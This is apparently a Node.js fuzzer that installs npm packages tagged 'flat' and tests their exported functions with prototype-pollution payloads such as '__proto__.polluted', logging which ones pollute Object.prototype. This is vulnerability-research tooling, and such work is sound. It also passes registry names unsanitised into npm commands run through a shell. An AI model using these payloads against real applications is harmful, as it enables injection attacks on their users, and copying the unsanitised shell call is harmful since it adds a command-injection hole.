const { execSync } = require('child_process');
const axios = require('axios');

function loadModule(moduleName) {
    try {
        // Try using require first
        return require(moduleName);
    } catch (err) {
        if (err.code === 'ERR_REQUIRE_ESM') {
            // If require fails due to ESM, use import
            return import(moduleName);
        } else {
            // Other errors
            throw err;
        }
    }
}

async function getNpmPackagesWithKeyword(keyword, maxResults = 100) {
    const packages = [];
    let offset = 0;

    while (packages.length < maxResults) {
        const response = await axios.get(`https://registry.npmjs.org/-/v1/search?text=keywords:${keyword}&size=20&from=${offset}`);
        const data = response.data;

        data.objects.forEach(obj => {
            if (obj.package && obj.package.name) {
                packages.push(obj.package.name);
            }
        });

        offset += 20;
        if (offset >= data.total || packages.length >= maxResults) {
            break;
        }
    }

    return packages.slice(0, maxResults);
}

(async () => {
    const packages = await getNpmPackagesWithKeyword('flat', 100);
    console.log('get npm list success');
    packages.forEach(pkg => {
        try {
            console.log('------------------------------------------------');
            console.log('[1] install package:', pkg);
            execSync(`npm install ${pkg}`);
        } catch (err) {
            console.log(err)
            process.exit()
        }
        try {
            console.log('[2] import module');
            var mod = loadModule(pkg);
        } catch (err) {
            console.log(err);
            process.exit();
        }
        console.log('[3] try itself');
        func = mod;
        try {
            //console.log('[3] - 1');
            func(obj, { '__proto__.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 2');
            func(obj, '__proto__.polluted', 'nodeBoB!');
            if (obj['polluted'] === 'nodeBoB!') {}
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 3');
            func(obj, { 'constructor.prototype.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 4');
            func({ '__proto__.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 5');
            func({ 'constructor.prototype.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        var modls = Object.keys(mod);
        //console.log(mod[modls[0]].length);
        console.log(modls);
        for (i in modls) {
            var obj = {};
            func = mod[modls[i]];
            //cnt = func.length;
            try {
                //console.log('[3] - 1');
                func(obj, { '__proto__.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 2');
                func(obj, '__proto__.polluted', 'nodeBoB!');
                if (obj['polluted'] === 'nodeBoB!') {
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 3');
                func(obj, { 'constructor.prototype.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 4');
                func({ '__proto__.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 5');
                func({ 'constructor.prototype.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
        }
        try {
            console.log('[4] remove package: ', pkg);
            execSync(`npm remove ${pkg}`);
        } catch (err) {
            console.log(err);
        }

    });
})();

